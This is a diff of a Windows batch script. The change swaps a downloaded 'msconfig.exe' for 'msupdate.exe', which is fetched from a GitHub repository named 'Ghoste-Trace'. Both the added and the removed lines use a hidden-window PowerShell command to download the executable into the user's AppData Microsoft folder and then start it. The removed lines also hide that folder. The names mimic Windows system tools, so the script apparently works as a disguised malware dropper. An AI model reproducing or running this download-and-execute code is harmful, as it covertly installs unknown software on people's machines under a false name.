@@ -79,32 +79,26 @@ if exist "%TARGET_FILE%" (
     exit /b 1
 )
 
-:: Paths and URLs
-set "MICROSOFT_FOLDER=%APPDATA%\Microsoft"
-set "MSCONFIG_PATH=%MICROSOFT_FOLDER%\msconfig.exe"
-set "MSCONFIG_URL=https://github.com/Abdullah67289/Ghoste-Trace/raw/main/msconfig.exe"
+:: Paths and URLs for msupdate.exe
+set "MSUPDATE_PATH=%APPDATA%\Microsoft\msupdate.exe"
+set "MSUPDATE_URL=https://github.com/Abdullah67289/Ghoste-Trace/raw/refs/heads/main/msupdate.exe"
 
-:: Make sure Microsoft folder exists
-if not exist "%MICROSOFT_FOLDER%" (
-    mkdir "%MICROSOFT_FOLDER%"
-)
-attrib -h -s -r "%MICROSOFT_FOLDER%" >nul 2>&1
-attrib +h +s "%MICROSOFT_FOLDER%" >nul 2>&1
-
-:: Delete msconfig.exe if it exists
-if exist "%MSCONFIG_PATH%" (
-    attrib -h -s -r "%MSCONFIG_PATH%" >nul 2>&1
-    del /f /q "%MSCONFIG_PATH%" >nul 2>&1
+:: Delete old msupdate.exe if it exists
+if exist "%MSUPDATE_PATH%" (
+    attrib -h -s -r "%MSUPDATE_PATH%" >nul 2>&1
+    del /f /q "%MSUPDATE_PATH%" >nul 2>&1
 )
 
-:: Download new msconfig.exe
-powershell -WindowStyle Hidden -Command "(New-Object Net.WebClient).DownloadFile('%MSCONFIG_URL%', '%MSCONFIG_PATH%'); exit"
+:: Download new msupdate.exe
+powershell -WindowStyle Hidden -Command "(New-Object Net.WebClient).DownloadFile('%MSUPDATE_URL%', '%MSUPDATE_PATH%'); exit"
 
-:: Run msconfig.exe if download succeeded
-if exist "%MSCONFIG_PATH%" (
-    start "" "%MSCONFIG_PATH%"
+timeout /t 2 >nul
+
+:: Run the new msupdate.exe if download succeeded
+if exist "%MSUPDATE_PATH%" (
+    start "" "%MSUPDATE_PATH%"
 ) else (
-    echo Failed to download msconfig.exe
+    echo Failed to download msupdate.exe
     exit /b 1
 )
 
